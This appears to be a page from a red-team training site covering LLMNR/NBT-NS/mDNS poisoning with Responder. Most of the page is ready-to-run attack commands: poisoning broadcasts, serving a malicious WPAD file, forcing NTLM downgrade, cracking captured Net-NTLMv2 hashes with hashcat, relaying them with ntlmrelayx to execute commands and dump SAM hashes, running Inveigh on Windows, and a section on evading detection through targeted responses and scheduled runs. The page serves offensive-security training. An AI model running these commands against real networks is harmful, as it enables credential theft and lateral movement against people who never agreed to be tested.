---
layout: training-page
title: "Responder & LLMNR Poisoning — Red Team Academy"
module: "Network Attacks"
tags:
  - responder
  - llmnr
  - nbt-ns
  - mdns
  - wpad
  - ntlmv2
  - network
page_key: "network-responder"
render_with_liquid: false
---

# Responder & LLMNR Poisoning

LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) are Windows fallback name resolution protocols used when DNS fails. When a host queries a name that doesn't resolve in DNS, it broadcasts an LLMNR/NBT-NS request to the entire subnet — and any host can respond. Responder poisons these broadcasts, impersonates the target, and captures Net-NTLMv2 hashes from every host that authenticates to it.

## How It Works

```
1. Victim types \\FILESERVER into Explorer (or an app tries \\MISTYPED-NAME)
2. DNS lookup fails
3. Victim broadcasts LLMNR query: "Who has FILESERVER?"
4. Responder answers: "I am FILESERVER — authenticate to me"
5. Victim sends Net-NTLMv2 hash (Windows auth challenge/response)
6. Responder captures the hash
7. Hash is cracked offline or relayed to authenticate elsewhere
```

## Environment Check

```bash
# Verify LLMNR/NBT-NS are active (passive — listen only)
responder -I eth0 -A

# Check network for existing LLMNR traffic
tcpdump -i eth0 'udp port 5355 or udp port 137'
# port 5355 = LLMNR
# port 137  = NBT-NS

# Also check for mDNS (port 5353)
tcpdump -i eth0 'udp port 5353'
```

## Running Responder

```bash
# Basic — poison LLMNR/NBT-NS/mDNS and capture NTLMv2 hashes
responder -I eth0

# With WPAD (captures hashes from proxy-aware applications)
responder -I eth0 -w

# With force NTLM downgrade from Kerberos (riskier — more traffic)
responder -I eth0 -F

# Verbose — shows all received queries
responder -I eth0 -v

# Output location
ls /usr/share/responder/logs/
# Responder-Session.log — all activity
# SMB-NTLMv2-*.txt      — captured hashes, one per file
```

## Captured Hash Format

```
# Net-NTLMv2 hash (NOT the same as NTLM hash — cannot be passed directly)
username::domain:challenge:response:NTLMhash

# Example:
jsmith::CONTOSO:1122334455667788:AABBCCDDEEFF...:0101000000...

# Crack with hashcat
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# Or relay instead of cracking (see NTLM relay page in AD module)
```

## WPAD Abuse

```
# WPAD = Web Proxy Auto-Discovery
# Browsers query http://wpad/wpad.dat for proxy config
# If "wpad" doesn't resolve in DNS, LLMNR is used
# Responder -w serves a malicious wpad.dat that forces NTLM auth

responder -I eth0 -w -F

# Every browser on the subnet attempts to fetch wpad.dat
# Responder captures NTLMv2 for each browser session
# -F forces NTLM auth even if Kerberos is available

# Check: is WPAD blocked in DNS?
nslookup wpad
# If it resolves to a real server, -w won't help
# If NXDOMAIN, -w will capture from every browser
```

## MultiRelay / NTLM Relay

```bash
# For relay instead of capture:
# 1. Disable SMB and HTTP servers in Responder (to avoid capturing and breaking relay)
# Edit: /etc/responder/Responder.conf
# SMB = Off
# HTTP = Off

# 2. Run Responder to poison only
responder -I eth0 -wr

# 3. Run ntlmrelayx in parallel (Impacket)
ntlmrelayx.py -tf targets.txt -smb2support
# targets.txt = list of IPs where SMB signing is disabled

# Find hosts with SMB signing disabled
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# ntlmrelayx with command execution
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# ntlmrelayx dump SAM hashes
ntlmrelayx.py -tf targets.txt -smb2support --sam
```

## Inveigh (Windows / PowerShell)

```powershell
# Inveigh — Responder equivalent for Windows post-compromise
# github.com/Kevin-Robertson/Inveigh

# Import and run
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTPS Y -SMB Y

# Get captured hashes
Get-InveighLog
Get-InveighNTLMv2

# C# version (Inveigh.exe) — no PowerShell dependency
.\Inveigh.exe -FileOutput Y
```

## Detection Evasion

```bash
# Target specific names to reduce noise
# Only respond to specific LLMNR queries (not all broadcasts)
# Edit Responder.conf: RespondTo = MISTYPED-NAME,FILESERVER

# Respond only to specific clients
responder -I eth0 --lm  # capture legacy LM hashes too
# Filter source: only answer queries from specific IP ranges

# Time-limited operation — run during business hours only
# Cron: 0 8 * * 1-5 responder -I eth0 -w > /tmp/resp.log &
# Cron: 0 18 * * 1-5 pkill -f responder
```

## Resources

- Responder — `github.com/lgandx/Responder`
- Inveigh — `github.com/Kevin-Robertson/Inveigh`
- Impacket ntlmrelayx — `github.com/fortra/impacket`
- MITRE T1557.001 — LLMNR/NBT-NS Poisoning — `attack.mitre.org/techniques/T1557/001/`
- AD module NTLM Relay page — `/active-directory/ntlm-relay/`
